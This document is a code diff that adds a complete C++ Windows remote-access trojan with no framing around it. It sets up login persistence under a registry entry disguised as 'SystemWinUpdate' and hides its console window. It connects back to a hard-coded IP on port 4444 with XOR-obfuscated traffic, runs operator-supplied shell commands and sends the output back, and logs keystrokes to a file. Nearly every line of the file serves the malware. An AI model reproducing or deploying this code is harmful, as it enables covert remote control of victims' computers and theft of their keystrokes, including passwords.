@@ -1,0 +1,119 @@
+#include <winsock2.h>
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+#include <thread>
+#include <string>
+#include <vector>
+#include <algorithm>
+#include <sstream>
+#include <winreg.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#define SERVER_IP "192.168.1.100"
+#define PORT 4444
+
+SOCKET sock;
+
+// XOR encryption (lightweight obfuscation)
+std::string xorEncryptDecrypt(const std::string& data, char key = 'K') {
+    std::string result = data;
+    for (size_t i = 0; i < data.size(); ++i)
+        result[i] ^= key;
+    return result;
+}
+
+// Auto-start via registry (adds entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
+void setupPersistence() {
+    char filePath[MAX_PATH];
+    GetModuleFileNameA(NULL, filePath, MAX_PATH);
+
+    HKEY hKey;
+    RegOpenKey(HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &hKey);
+    RegSetValueEx(hKey, "SystemWinUpdate", 0, REG_SZ, (BYTE*)filePath, strlen(filePath));
+    RegCloseKey(hKey);
+}
+
+// Execute shell command
+std::string execCommand(const std::string& cmd) {
+    char buffer[128];
+    std::string result;
+    FILE* pipe = _popen(cmd.c_str(), "r");
+    if (!pipe) return "[Error] Command failed.";
+    while (fgets(buffer, sizeof(buffer), pipe))
+        result += buffer;
+    _pclose(pipe);
+    return result;
+}
+
+// Encrypt and send data
+void sendEncrypted(const std::string& data) {
+    std::string encoded = xorEncryptDecrypt(data);
+    send(sock, encoded.c_str(), encoded.length(), 0);
+}
+
+// Receive and decrypt
+std::string recvDecrypted() {
+    char buffer[1024];
+    int recv_size = recv(sock, buffer, sizeof(buffer), 0);
+    if (recv_size <= 0) return "";
+    return xorEncryptDecrypt(std::string(buffer, recv_size));
+}
+
+// Keylogger thread
+void keylogger() {
+    std::ofstream log("klg.log", std::ios::app);
+    while (true) {
+        for (int key = 8; key <= 190; key++) {
+            if (GetAsyncKeyState(key) == -32767) {
+                log << key << ' ';
+                log.flush();
+            }
+        }
+        Sleep(20);
+    }
+}
+
+// Remote shell handler
+void shellHandler() {
+    while (true) {
+        std::string command = recvDecrypted();
+        if (command == "exit") break;
+        std::string output = execCommand(command);
+        sendEncrypted(output.empty() ? "[Done]" : output);
+    }
+}
+
+// Main connection initializer
+bool initConnection() {
+    WSADATA wsa;
+    struct sockaddr_in server;
+
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_addr.s_addr = inet_addr(SERVER_IP);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(PORT);
+
+    return connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0;
+}
+
+// Entry point
+int main() {
+    FreeConsole();
+    setupPersistence();
+
+    if (!initConnection()) return 1;
+
+    std::thread shell(shellHandler);
+    std::thread logger(keylogger);
+
+    shell.join();
+    logger.join();
+
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
